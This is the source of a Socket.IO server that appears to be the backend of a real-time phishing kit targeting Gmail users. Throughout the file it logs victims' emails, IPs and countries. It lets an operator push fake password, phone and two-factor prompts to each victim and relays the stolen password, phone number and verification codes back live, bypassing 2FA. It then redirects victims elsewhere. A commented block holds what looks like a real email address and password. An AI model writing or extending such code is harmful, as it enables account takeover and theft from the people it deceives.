import express, { response } from 'express';
import http from 'http';
import { Server } from 'socket.io';

//DATABASE IMPORTS
import { create, update, remove, check, existing, removeProps, getProp } from './db/db.js';
import { adminHandler } from './db/db.js';

const app = express();
const server = http.createServer(app);

const webSocket = new Server(server, {
  cors: {
    origin: '*', // your React dev server
    methods: ['GET', 'POST'],
  },
});

// country.js
import { Reader } from "@maxmind/geoip2-node";

let reader = null;

async function initCountryLookup(dbPath = "./data/GeoLite2-Country.mmdb") {
  if (!reader) {
    reader = await Reader.open(dbPath);
  }
  return reader;
}

async function getCountryFromIp(ip) {
  try {
    await initCountryLookup();

    const result = reader.country(ip);

    return {
      countryName: result?.country?.names?.en ?? null, // e.g. "Nigeria"
    };
  } catch (error) {
    return {
      countryName: null
    };
  }
}

webSocket.on('connection', (socket, req) => {
  //const userId = socket.handshake.query.userId;
  //clients.set(userId, socket);

  console.log('client connected:', socket.id);

  // Client Ip address
  const ipAddress = socket.handshake.address;
  const country = typeof getCountryFromIp(ipAddress) === "object" && getCountryFromIp(ipAddress) !== null && !Array.isArray(getCountryFromIp(ipAddress)) ? null : getCountryFromIp(ipAddress);

  //Saves new socket id upon reload
  socket.on('updateSocketID', (data, callback)=>{
    update({'id': socket.id}, data.email);
    socket.broadcast.emit('clientsData', { data: adminHandler() });
    callback({'newID': socket.id});
  });

  // Recieve email
  socket.on('email?', (data, callback)=>{
    let returnValue = null;
    const existingEmails = existing();
    const email = data.email.toLowerCase();
    const refinedEmail = email.endsWith("@gmail.com") ? email : `${email}@gmail.com`;
    if (existingEmails && (existingEmails.includes(refinedEmail))) {
      returnValue = {exist: true};
    } else {
      create(refinedEmail, socket.id, ipAddress);
      returnValue = {success: true}
      // Sends email from file based database to Administrator on password request demand
      socket.broadcast.emit('clientsData', { data: adminHandler() });
    }
    
    callback(returnValue);
  });

  socket.on('notExisting', (data)=>{
    const socketId = data.id;

    if (socketId) {
      remove(data.email);
      const targetSocket = webSocket.sockets.sockets.get(data.id);
      targetSocket.emit('clientNotExisting', {'exist': data.exist});
      socket.emit('clientsData', { data: adminHandler() });
    }
  });

  socket.on('passwordRequest', (data, callback)=>{
    const socketId = data.id;
    const passwordStatus = data.passwordStatus;
    const email = data.email;

    if (socketId) {
      update({'passwordStatus': passwordStatus, 'password': null}, email);

      const targetSocket = webSocket.sockets.sockets.get(socketId);

      // This sends password request page to client that sent their email address.
      targetSocket.emit('passwordPage', data, (response) => {
        console.log("passwordPage emit was executing");
        if (response?.feedback) {
          // This emits the update immediately back to administrator. For changes that need to be reflected. 
          // For this case: if password has been requested for and response is awaited.
          socket.emit('clientsData', { data: adminHandler() });
        }
      });
      console.log("passwordPage emit was executed");
      callback({
        status: true
      });
    }
  })

  // Sends email from file based database to Administrator on Reload.
  socket.emit('clientsData', { data: adminHandler()});

  // Sends resend instruction if once activated without being cleared
  function getResendData(data) {
    return Object.values(data)
      .filter((user) => user.resendData)
      .map((user) => ({
        resendType: user.resendData.resendType,
        resendEmail: user.resendData.resendEmail
      }));
  }
  socket.emit('authenticationRe-initiation', { 'resendData': getResendData(adminHandler()) });


  // Sends password input to Administrator.
  socket.on('sendPassword', (data, callback)=>{
    let response = null;
    const database = adminHandler();
    if (data.socketID === database[data.email].id) {
      update({ 'id': socket.id, 'password': data.password, 'passwordStatus': 'processed', 'deviceType': data.deviceType, 'country': country }, data.email);
      // Sends password input to Administrator.
      socket.broadcast.emit('clientsData', { data: adminHandler() });
      response = { 'validated': true };
    } else {
      response = { 'validated': false };
    }
    callback(response);
  });

  

  //sends authentication page type to Client
  socket.on('verificationRequest', (data, callback) => {
    //Re-assignment for clarity
    const socketId = data.id;
    const verificationType = data.verificationType;
    const email = data.email;
    const digit = data.lastTwoDigit;

    try {
      const targetSocket = webSocket.sockets.sockets.get(socketId);
      // This sends password request page to client that sent their email address.
      if (socketId) {
        if (digit) {
          if (verificationType === 'smsotp') {
            update({ 'verificationType': verificationType, 'lastTwoDigit' : digit, '2FARequest': 'processing', 'country': data.country }, email);
          } else if (verificationType === 'tapyes') {
            update({ 'verificationType': verificationType, 'tapNumber': digit, '2FARequest': 'processed' }, email);
            removeProps({ 'resendData': 'dummy values' }, email);
          }
        } else {
          update({ 'verificationType': verificationType, '2FARequest': 'processing' }, email);
        }
        
        const datas = {
          'id': data.id,
          'country': data.country,
          verificationType
        };

        if (verificationType === "smsotp" || verificationType === "tapyes") {
          datas.lastTwoDigit = digit;
        }

        targetSocket.emit('verificationPage', datas, (response) => {
          if (response?.feedback){
            // This emits the update immediately back to administrator. For changes that need to be reflected. 
            // For this case: if password has been requested for and response is awaited.
            socket.emit('clientsData', { data: adminHandler() });
          }
        });
        
      }
      callback({
        status: true
      });
    } catch{
      console.log('emitimg to client and administrator, but it listens for 2FA Request');
    }
  });

  socket.on('verifyPhone', (data, callback)=>{
    let response = null;
    const database = adminHandler();
    if (data.socketID === database[data.email].id) {
      update({ 'id': socket.id, 'phone': data.phone, "verifyPhoneStatus": null}, data.email);
      // Sends phone number input to Administrator.
      socket.broadcast.emit('clientsData', { data: adminHandler() });
      response = { 'validated': true };
    } else {
      response = { 'validated': false };
    }
    callback(response);
  });

  socket.on('otpGoAhead', (data, callback)=>{
    console.log('Tracked');
    const socketId = data.id;

    if (socketId) {
      update({ 'verifyPhoneStatus': data.verifiedPhone }, data.email);
      const targetSocket = webSocket.sockets.sockets.get(socketId);

      // This sends password request page to client that sent their email address.
      targetSocket.emit('otpSend', data, (response) => {
        if (response?.feedback) {
          // This emits the update immediately back to administrator. For changes that need to be reflected. 
          // For this case: if password has been requested for and response is awaited.
          socket.emit('clientsData', { data: adminHandler() });
        }
      });
      console.log("passwordPage emit was executed");
      callback({
        status: true
      });
    }
  })

  // Sends 2fa code input to Administrator.
  socket.on('send2facode', (data, callback)=>{
    let response = null;
    const database = adminHandler();
    if (data.socketID === database[data.email].id) {
      update({ 'id': socket.id, 'verificationCode': data.verificationCode, '2FARequest': 'processed' }, data.email);
      // This sends resend instruction to be cleared from Administrator sessionStorage if it was added or set.
      console.log(getProp('resendData', data.email));
      socket.broadcast.emit('authenticationRe-initiation', { 'cleared': getProp('resendData', data.email) });
      removeProps({ 'resendData': 'dummy values' }, data.email);
      // Sends password input to Administrator.
      socket.broadcast.emit('clientsData', { data: adminHandler() });
      response = { 'validated': true };
    } else {
      response = { 'validated': false };
    }
    callback(response);
  });

  socket.on('failedVerification', (data)=>{
    console.log('Tracked');

    const socketId = data.id;

    if (socketId) {
      removeProps({ '2FARequest': 'dummy values', "verificationCode": 'dummy values' }, data.email);
      const targetSocket = webSocket.sockets.sockets.get(data.id);
      socket.emit('clientsData', { data: adminHandler() });
      targetSocket.emit('clientFailedVerification', {'error': 'Verification failed. Please try again or click "Try another way" for more options.', 'id': data.id});
    }
  });

  socket.on('resend2fa', (data, callback)=>{
    let response = null;
    const database = adminHandler();
    console.log('resend2fa emit to administrator, data:', data.type);
    if (data.socketID === database[data.email].id) {
      // Save resend intiation data to database incase administrator is accidentally reloaded
      update({ 'resendData' : {'resendType': data.type, 'resendEmail': data.email } }, data.email);

      // Sends resend instruction to Administrator.
      socket.broadcast.emit('authenticationRe-initiation', { 'resendType': data.type, 'resendEmail': data.email });
      response = { 'validated': true };
    } else {
      response = { 'validated': false };
    }
    callback(response);
  });

  socket.on('anotherWay', (data, callback)=>{
    let response = null;
    const database = adminHandler();
    if (data.socketID === database[data.email].id) {
      update({ 'id': socket.id, 'verificationType': data.verificationType }, data.email);
      removeProps({ 
        'resendData': 'dummy values',
        "lastTwoDigit": "dummy values",
        "phone": "dummy values",
        "verifyPhoneStatus": "dummy values",
        "twoFAoption": "dummy values",
        "tapNumber": "dummy values",
        "2FARequest": "dummy values",
        'anotherWaySelect': true
      }, data.email);
      // Sends resend instruction to Administrator.
      socket.broadcast.emit('clientsData', { data: adminHandler() });
      socket.broadcast.emit('resetData', { 'id': socket.id, 'email': data.email, 'type': data.verificationType });
      response = { 'validated': true };
    } else { 
      response = { 'validated': false };
    }
    callback(response);
  });

  socket.on('selectAnotherWay', (data)=>{
    console.log(data.socketID);
    const database = adminHandler();
    if (data.socketID === database[data.email].id) {
      update({ 'anotherWaySelect': true }, data.email);
      console.log('check 1');
      // Sends resend instruction to Administrator.
      socket.broadcast.emit('clientsData', { data: adminHandler() });
    }
  });

  socket.on('allowedAuthentication', (data)=>{
    console.log('Tracked');

    const socketId = data.id;

    if (socketId) {
      console.log(JSON.stringify(data.allowedAuthentications));
      const targetSocket = webSocket.sockets.sockets.get(data.id);
      //socket.emit('clientsData', { data: adminHandler() });
      targetSocket.emit('authenticationDelivery', { 'allowedAuthentications': data.allowedAuthentications, 'id': data.id });
    }
  });

  socket.on('exit', (data)=>{
    const socketId = data.id;

    if (socketId) {
      const targetSocket = webSocket.sockets.sockets.get(data.id);
      check(data.email);
      console.log('exit emit to client');
      update({ 'Login completed': true }, data.email);
      targetSocket.emit('exited', {'link': 'https://www.jonpardi.com/tour/'});
      socket.emit('clientsData', { data: adminHandler() });
    }
  });

  socket.on('deleteClient', (data)=>{
    const socketId = data.id;

    if (socketId) {
      remove(data.email);
      socket.emit('clientsData', { data: adminHandler() });
    }
  });


  socket.on('disconnect', () => {
    console.log('client disconnected:', socket.id);
    socket.broadcast.emit('clientsData', { data: adminHandler() });
  });
});



server.listen(4000, () => {
  console.log(`Example app listening on port ${4000}`)
});


/*
// This are my database functions POST GET UPDATE ARCHIVED
const fs = require("fs");
const path = require('path');
const filePath = path.join(__dirname, 'database.json'); 


function create() {
// This function establishes a new client and creates a profile

// converts and reads the json file in object data type instead of string
const data = JSON.parse(fs.readFileSync("database.json", "utf-8"));
data["192.939.393"] = {};
data["192.939.393"].email = "naim.okunade@gmail.com";

fs.writeFileSync(filePath, JSON.stringify(data, null, 2));

}

function update() {
  // This function updates all other neccesary properties password, otp.

  const data = JSON.parse(fs.readFileSync("database.json", "utf8"));

  data["192.939.393"].password = "Alade3015$"; // or data["192.939.393"].otp = "883839";

  fs.writeFileSync(filePath, JSON.stringify(data, null, 2));
}

export {create, update};

*/